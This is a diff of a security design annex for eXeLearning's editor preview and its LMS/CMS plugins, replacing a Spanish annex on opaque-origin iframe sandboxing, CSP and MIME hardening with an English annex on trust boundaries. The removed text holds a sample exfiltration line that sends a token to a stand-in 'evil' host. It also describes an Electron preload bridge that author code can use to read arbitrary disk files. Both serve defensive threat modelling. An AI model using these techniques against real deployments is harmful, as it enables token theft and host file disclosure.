@@ -1,200 +1,75 @@
-# Anexo — Modo «siempre opaco» (endurecimiento posterior)
+# Annex — Simplified editor preview trust boundaries
 
-> Estado: **implementado** sobre las ramas de los PRs en curso — eXeLearning core
-> (`fix/opaque-iframe-external-media`, PR #1968), `mod_exelearning` (`feature/secure-iframe-scorm-bridge`,
-> PR #80), `wp-exelearning` (`feature/secure-iframe-sandbox`, PR #56), `omeka-s-exelearning`
-> (`feature/secure-iframe-sandbox`, PR #21) y Procomún (`feat/align-embed-bridge-with-mod`, PR #260).
-> Este anexo distingue lo
-> **implementado** (con evidencia de test), las **limitaciones residuales** y el **trabajo futuro**.
-> No sobreafirma: el aislamiento lo impone la política de sandbox del host y, ahora, también la
-> previsualización del editor de eXeLearning core.
+> Status: architecture implemented on local `feature/simplified-opaque-iframe`
+> branches for evaluation. This annex replaces the earlier protocol-v2 design;
+> it does not change the evidence for published-content isolation in the paper.
 
-## 1. El origen opaco deja de ser opcional
+## 1. Normal editor preview
 
-- **eXeLearning core (previsualización del editor).** La previsualización del editor **también es de
-  origen opaco** allí donde hay un servidor (nube, host embebido y —como objetivo— Electron): una
-  **URL-capability real por página** entrega el documento con una **CSP `sandbox` en la cabecera de
-  respuesta** (equivalente a `previewCspHeader()` de core), de modo que el navegador impone el origen
-  opaco sin depender del atributo del iframe. El giro respecto a revisiones previas es que **un Service
-  Worker no es la primitiva de servido**: un SW **no puede** servir ni controlar un iframe de origen
-  opaco —el navegador lo desactiva sin `allow-same-origin` (*«Service worker is disabled because the
-  context is sandboxed and lacks the allow-same-origin flag»*), y sus subrecursos caerían a la red
-  recibiendo el `index.html` de la SPA y fallando la comprobación estricta de MIME—, así que el servido
-  opaco recae en un **servidor HTTP real** (o, sin servidor, en `srcdoc`), nunca en el SW. El **saneador**
-  del Y.Doc se conserva como **defensa en profundidad**, no como único aislamiento. El transporte por
-  contexto se detalla en la **§8**. El origen opaco para contenido *verbatim* lo imponen además los
-  **plugins host**, donde un servidor real —no un Service Worker— sirve el paquete.
-- **Plugins host (Moodle/WordPress/Omeka S).** Se elimina el modo `legacy` (same-origin) de la
-  configuración de producción. No queda ningún ajuste de administración que reactive `allow-same-origin`
-  para contenido de paquete no confiable, y **no hay degradación silenciosa**: si el servido seguro
-  falla se muestra un aviso de bloqueo, nunca un fallback same-origin.
-- **Procomún.** La previsualización ELPX ya era opaca; este endurecimiento confirma que no hay fallback
-  same-origin.
+The regular web editor, server editor, static/PWA build, Electron application,
+and PHP-WASM playground keep eXeLearning's established preview transport.
+Official runtime code, iDevice JavaScript, themes, MathJax, and maintained
+libraries execute normally.
 
-> **Aclaración respecto a §6.2.2.** PR #1968 (el puente de medios) solo hace *funcionar* los medios
-> externos dentro de un host opaco; **nunca** aportó el aislamiento del iframe. El aislamiento del
-> contenido *verbatim* lo impone la política de sandbox de los **plugins host**; la previsualización del
-> editor de core es **de origen opaco** allí donde hay servidor (servida por HTTP con CSP `sandbox` de
-> respuesta, no por el Service Worker), con el saneador del Y.Doc como defensa en profundidad (véase §8).
+Only author-controlled HTML is transformed at the last safe boundary before it
+is combined with trusted output. A parser-based policy detects scripts, event
+handlers, active URLs, `srcdoc`, unsafe iframes, object/embed/applet, active SVG
+and XML, meta refresh, base elements, privileged form actions, and legacy HTML
+imports. The result records categories and actions for the UI. Stored Yjs data,
+saved projects, reopened projects, and exported packages retain the original
+content byte-for-byte at this layer.
 
-## 2. Política de embeds: `strict` por defecto
+When active content is found, an accessible warning offers an explicit enable
+or disable action. Authorization is scoped to the current project and process
+session; opening another project does not inherit it. Enabling is a trust
+decision, not a security guarantee.
 
-El modo de promoción de embeds externos pasa a **`strict` por defecto** en los cinco repos; `open` es
-una opción explícita (ajuste de administración en los plugins, variable de entorno
-`PUBLIC_EXELEARNING_EMBED_MODE` en Procomún). Cualquier valor ausente o no reconocido **falla de forma
-segura a `strict`**. En `strict` solo se promueven los proveedores mantenidos (YouTube, Vimeo,
-Dailymotion, Mediateca de Madrid) con reconstrucción canónica de URL; se rechazan `userinfo`, no-HTTPS,
-same-origin, sub/superdominios del LMS, literales IP, `localhost`/`.local`, ids malformados y el
-*redirect-laundering*.
+## 2. Embedded LMS/CMS preview
 
-> **Corrección a §6.2.2/§6.3 (revisión previa).** El relé de superposición tenía por defecto el
-> *invariante estructural* (cualquier iframe https cross-origin) y la *lista blanca* solo en `strict`.
-> Tras este cambio el **valor por defecto es `strict`** (lista blanca + reconstrucción canónica), y
-> `open` (invariante estructural) es la opción. El puente **modal** nunca recibe una URL: reconstruye
-> la URL canónica desde `{proveedor, id}` con lista cerrada YouTube/Vimeo.
+An embedded editor renders its complete preview inside an iframe sandbox that
+omits `allow-same-origin`. The child therefore cannot read the host DOM,
+cookies, storage, CSRF tokens, JavaScript objects, or authenticated APIs.
 
-## 3. CSP: estricta por defecto, perfil `compatible` opcional
+The minimal host contract is:
 
-La CSP del documento de contenido es **estricta por defecto**: sin comodín `https:` en
-`script/img/media-src` (de modo que el token de fichero que viaja en la URL no pueda exfiltrarse, p.
-ej. con `new Image().src='https://evil/?'+location.pathname`), y `frame-src` limitada a los proveedores
-mantenidos. Existe un perfil **`compatible`** explícito, documentado como más débil y **no** por
-defecto (ajuste/filtro/entorno), que reabre `img/media/script` a `https:` para contenido con imágenes
-externas o un CDN de MathJax. Con la CSP como mitigación primaria, el **IP-binding del token** (Moodle)
-queda como **defensa en profundidad** (con su test de regresión).
+1. The editor generates one complete ZIP snapshot.
+2. An authenticated, CSRF-protected, owner/project-scoped route stores or
+   replaces it and returns an unguessable capability.
+3. A cookieless route serves `/preview/{capability}/index.html` and assets.
+4. Scriptable MIME types receive a response-level sandbox CSP plus hardening
+   headers.
+5. Paths and MIME types are validated; capabilities expire and are cleaned up.
+6. `postMessage` accepts closed payload shapes only and verifies
+   `event.source`; opaque origins make `event.origin === "null"` expected.
 
-## 4. MIME/PDF
+No silent fallback may render embedded content same-origin. The contract does
+not include layered fixed/session/generated assets, atomic incremental
+revisions, conflict recovery, external-media geometry relays, or transport
+selection matrices. Updates replace the complete snapshot.
 
-Todo fichero servido lleva `X-Content-Type-Options: nosniff` y `Referrer-Policy: no-referrer`. Un PDF
-same-origin debe pertenecer al paquete; un **PDF cross-origin** se renderiza con `sandbox="allow-same-origin"`
-(sin scripts ni top-navigation), evitando que un servidor que sirva HTML en una ruta `.pdf` redirija la
-pestaña del host a phishing. (Procomún sirve además todo asset no-HTML con CSP `sandbox`, cerrando el
-vector de SVG same-origin.)
+## 3. Published content
 
-## 5. Control de deriva del puente compartido
+Published or delivered packages have a separate threat model. Some platforms
+serve them through an opaque iframe and validated tracking bridge; others retain
+same-origin compatibility. Preview filtering must not be described as changing
+the exported package or as protecting delivery contexts.
 
-`mod_exelearning/tools/check-embed-sync.mjs` se amplía para cubrir, además del relé/shim de promoción,
-el **puente modal** (`exe_media_policy.js` en core + mod/wp/omeka/procomun, y el host raw-postMessage
-`exe_media_host.js` en mod/wp/omeka/procomun; el fork SDK de core se excluye a propósito) e incluir
-**Procomún**. Fuente canónica, comando de sincronización y estado de CI documentados en
-`tools/EMBED-SYNC.md`. (Sin infraestructura de CI compartida entre repos, sigue siendo un paso local
-obligatorio del checklist de PR.)
+## 4. Electron
 
-## 6. Evidencia de comportamiento: `testing-the-sandbox.elpx`
+Electron increases impact because preload bridges can expose filesystem, shell,
+dialog, configuration, or IPC operations. Context isolation does not prevent a
+same-origin child from referring to a privileged bridge on its parent window.
+The simplified decision therefore disables explicit author-active-content
+authorization in Electron while retaining first-party preview JavaScript. A
+future implementation may enable it only in separate `webContents` with no
+privileged preload.
 
-Se añade un fixture compartido (1 página, 1 iDevice de texto, 1 iframe de YouTube y una sonda en línea
-que registra si `parent/top` `location/document/cookie/localStorage` son accesibles). En los hosts que
-sirven el `.elpx` verbatim, la sonda debe reportar **bloqueo** (SecurityError) en modo opaco. La
-previsualización del editor de eXe core, servida por el **transporte HTTP opaco** (§8) allí donde hay
-servidor, comparte esa propiedad de origen opaco; el saneador del Y.Doc queda como **defensa en
-profundidad** (regenera la previsualización sin `<script>` en línea), no como único aislamiento. El único
-transporte same-origin que resta es el interino de Electron (§8), a cerrar.
+## 5. Security claims and limitations
 
-## 7. Limitaciones residuales y trabajo futuro
-
-- **Service Worker vs. iframe opaco (playgrounds php-wasm y el interino de Electron).** Un Service Worker
-  **no puede servir ni controlar** un iframe de origen opaco, así que **no es la primitiva de servido**:
-  el servido opaco lo aporta un **servidor HTTP real** (o `srcdoc` sin servidor), nunca el SW. Donde no
-  hay servidor real y solo queda un SW, el documento es forzosamente same-origin. Esto ya **no** afecta a
-  la previsualización del editor de core en despliegues con servidor —opaca por HTTP (§8)—; afecta a (a)
-  los **playgrounds php-wasm** (WordPress, Omeka **y Moodle**), que no tienen servidor real y cuyo SW solo
-  sirve documentos same-origin; y (b) el **interino de Electron** (§8), aún servido por SW y a migrar a
-  `app://localhost/preview/{id}/*` opaco. No se reintroduce el modo legacy de producción: el same-origin
-  de los playgrounds se habilita solo por una **vía de escape solo para desarrollo** (constante
-  `EXELEARNING_UNSAFE_LEGACY_IFRAME`, por defecto desactivada, **nunca** un ajuste de administración
-  —fuera de la UI de administración—, documentada como **insegura**; un test prueba que está apagada por
-  defecto). La constante la declara el
-  `blueprint.json` de **cada plugin** a través de un mecanismo **genérico** del playground —un mu-plugin
-  vía `writeFile` en WordPress, y una propiedad `phpConstants` añadida a los motores de `moodle-playground`
-  y `omeka-s-playground`—, de modo que la configuración vive en el plugin y no en el motor del playground.
-  Es una **limitación de infraestructura del Playground**, no del plugin.
-- **`mod_exeweb` y `mod_exescorm` siguen siendo vulnerables.** Renderizan contenido same-origin sin
-  sandbox y pueden exponer `sesskey`/DOM/API. **No se modifican** en este trabajo. Hasta que reciban
-  tratamiento de iframe opaco (y `mod_exescorm` un puente SCORM equivalente al de `mod_exelearning`),
-  deben documentarse como **solo para contenido confiable**.
-- **SCORM/xAPI en la previsualización de eXe core.** Core no tiene relé SCORM para su propia
-  previsualización (es una comprobación visual, no un intento calificado); la previsualización es de
-  origen opaco por el transporte HTTP (§8) allí donde hay servidor, con el saneador del Y.Doc como
-  defensa en profundidad. Los hosts que sí califican (Moodle) relevan SCORM/xAPI por puentes `postMessage`
-  validados con rechazo de mensajes forjados (origen/nonce/acción/forma/replay), cubierto por sus tests
-  `scorm_bridge.test.js` / `xapi_listener.test.js`.
-
-## 8. Transporte de la previsualización del editor: HTTP opaco donde hay servidor, `srcdoc` en static sin servidor
-
-> **Modelo de transporte (consolida §1, §6 y §7).** La abstracción de transportes de PR #1968
-> (`fix/opaque-iframe-external-media`) fija el modelo final, ya reflejado en §1/§6/§7: la previsualización
-> del editor **es de origen opaco en todos los modos con servidor** —servida por HTTP, no por el Service
-> Worker, que no puede servir ni controlar un documento opaco—. El único transporte same-origin que resta
-> es el **interino de Electron**, a cerrar.
-
-La misma insight que aísla el **contenido publicado** (origen opaco sin `allow-same-origin`) se extiende
-ahora a la **previsualización de autoría**. La clave es que la opacidad la aporta la **cabecera de
-respuesta** `Content-Security-Policy: sandbox …`, no el atributo del iframe: así una **URL real por
-página** y un **origen opaco** coexisten, lo que da navegación entre páginas y «abrir en pestaña nueva»
-que `srcdoc` no puede ofrecer (su URL es `about:srcdoc`; toda navegación se puente al padre por
-`postMessage`).
-
-El transporte se elige de forma determinista (`previewTransport.js`), **sin degradación silenciosa** a
-same-origin:
-
-| Contexto | Transporte | Servido de origen opaco |
-|---|---|---|
-| Editor cloud (servidor) | **HTTP opaco** | Servidor eXe: URL-capability efímera `/preview/{id}/*` con CSP `sandbox` de respuesta. |
-| Editor embebido (LMS/CMS) | **HTTP opaco servido por el host** *(recomendado)* → `srcdoc` *(fallback sin configuración)* | El plugin sirve `/preview/{id}/*` desde su primitiva sin cookies (Moodle `tokenpluginfile.php`, WP REST público, Omeka `ContentController`, Nextcloud `Controller` público, Procomún URL-capability), emitiendo el mismo contrato. |
-| Editor static/PWA standalone | **`srcdoc`** | Sin servidor y sin SW que pueda servir un documento opaco → iframe `srcdoc` autocontenido. |
-| Electron (interino) | Service Worker (same-origin) | Interino; el objetivo es servir `app://localhost/preview/{id}/*` (o un servidor local) con el mismo contrato HTTP opaco. |
-
-**El contrato de servido es único y compartido.** El **cliente** de previsualización se reutiliza tal
-cual; cada host reimplementa solo el **lado servidor** sobre su primitiva sin cookies. eXe core publica el
-contrato canónico en `doc/development/preview-serving-contract.md` (endpoints, modelo de URL-capability,
-y la cadena CSP `previewCspHeader()` emitida **verbatim**), y los plugins lo replican en su rama
-`feature/secure-iframe-*`. El editor lo activa con `embeddingConfig.previewTransport:'http'` +
-`previewBasePath`.
-
-**Precisión de seguridad incorporada al contrato.** La CSP `sandbox` debe emitirse en **todo tipo de
-documento scriptable** — `text/html`, **`image/svg+xml`**, `application/xml`, `application/xhtml+xml`— no
-solo en HTML. Un SVG de autor servido sin la CSP ejecuta su `<script>` en línea **same-origin** al abrirse
-top-level («abrir imagen en pestaña nueva»); `nosniff` no ayuda porque `image/svg+xml` ya es un tipo de
-documento scriptable.
-
-**Por qué Electron es el caso de mayor impacto (no el menor).** Mientras la previsualización de Electron
-siga siendo same-origin por SW, el JS de autor alcanza `window.top.electronAPI.readFile(rutaArbitraria)`
-(→ `fs.readFileSync`, sin validación de ruta), es decir **lectura arbitraria del disco** (claves SSH/cloud,
-cookies del navegador) — un compromiso de **host**, no de sesión, defendido hoy solo por el saneador del
-Y.Doc. Es el contexto que más urge migrar al servido HTTP opaco (`app://localhost/preview/{id}/*` vía
-`protocol.handle`, o un servidor local en `127.0.0.1` — el protocolo custom es preferible por no exponer
-superficie de red). El same-origin de la previsualización de core es aceptable **solo** en el interino de
-Electron y **debe** cerrarse; en cualquier despliegue con servidor la previsualización es opaca por HTTP.
-
-**Requisito serverless.** El único contexto que no puede usar el contrato HTTP es el static/PWA
-standalone (CDN / GitHub Pages / `file://`): no hay servidor, y un Service Worker no puede servir un
-documento opaco (sus subrecursos lo esquivan). Ahí `srcdoc` es el único transporte opaco posible, con su
-menor fidelidad confinada al contexto menos crítico.
-
-**Invariante de vía única de servido (endurecimiento de despliegue).** La opacidad la aporta la CSP
-`sandbox` de la *respuesta*, luego solo se sostiene si el documento se entrega **exclusivamente** por la
-ruta-capability que emite esa cabecera. Un anti-patrón sutil aparece cuando el host respalda el almacén de
-sesión con un directorio **servible directamente por el servidor web**: una revisión adversarial de las
-ramas v2 encontró que Omeka S materializaba los documentos bajo `{file_store}/exelearning-preview/…`
-(dentro de `OMEKA_PATH/files/`, servido estático) y WordPress bajo `wp_upload_dir()/exelearning-preview/…`
-(dentro de `wp-content/uploads/`, servido estático). Un `GET` directo a esa ruta estática sirve el HTML/JS
-de autor **same-origin y sin la CSP `sandbox`** —que solo añade el controlador, no el servidor de
-ficheros—, anulando la garantía opaca. El `previewId` es un UUID inadivinable, así que no es explotable a
-ciegas, pero es una **segunda vía de servido no aislada** que se activa si el identificador se filtra
-(referer, logs, enlace compartido): un fallo de defensa en profundidad, no un endurecimiento cosmético.
-La mitigación es negar el acceso web directo al almacén —`.htaccess` con `Require all denied` (Apache 2.4)
-/ `Deny from all` (2.2) más un `index.php` inerte, escritos de forma idempotente al crear el directorio
-base; en nginx u otros servidores, ubicar el almacén **fuera del *web root*** o añadir un `location` de
-denegación—. Corregido en Omeka S (`f628936`) y WordPress (`0098efd`); Moodle (`make_temp_directory`),
-Nextcloud (`{datadirectory}`) y Procomún (almacén en memoria) no comparten el patrón por convención de sus
-frameworks. Generalización para el modelo de amenaza: **un origen opaco por CSP de respuesta exige que no
-exista ninguna otra ruta —estática o de aplicación— capaz de entregar el mismo documento sin esa
-cabecera**; el contrato lo fija como invariante de servido (`preview-serving-contract.md`, «Security
-invariants»: la ruta de servido alcanza solo documentos/recursos de la sesión y ficheros fijos
-manifest-gated, nunca otras rutas de la aplicación).
-
-> Las versiones EN del cuerpo (§6.2.2/§6.3) deben reflejar el nuevo **`strict` por defecto**, el modo
-> «siempre opaco», **el transporte HTTP opaco de la previsualización del editor (esta §8)** y el
-> **invariante de vía única de servido** (el almacén de sesión no debe ser servible directamente por el
-> servidor web); este anexo recoge los cambios implementados para incorporarlos en la próxima revisión del
-> cuerpo.
+Source-aware filtering and opaque-origin isolation are complementary, not
+equivalent. Filtering can miss an author-controlled insertion point; opaque
+isolation protects the host origin even when authored code runs. Conversely,
+opaque sandboxing does not stop all network requests, tracking, phishing, or
+social engineering. Capability URLs are bearer secrets until expiry, and host
+plugins still need bounded storage, cleanup, path validation, CSRF enforcement,
+and browser-level integration tests.
